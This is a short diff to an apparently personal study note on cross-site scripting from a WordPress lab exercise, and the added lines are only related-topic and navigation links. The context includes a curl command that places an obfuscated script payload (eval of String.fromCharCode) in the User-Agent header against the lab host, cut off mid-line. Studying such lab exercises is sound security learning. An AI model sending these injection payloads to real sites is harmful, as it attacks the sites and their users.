@@ -447,3 +447,13 @@ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,11
 > © cot
 > Figure 34: Confirming that our Attack Succeeded
 > ```
+
+---
+%% graph-links %%
+## Related
+- [[Basic XSS]]
+- [[Identifying XSS Vulnerabilities]]
+
+> [!info] Navigation
+> Section: [[Web Applications/Cross-Site Scripting/_index|Cross-Site Scripting]] · Home: [[🏠 Home]]
+
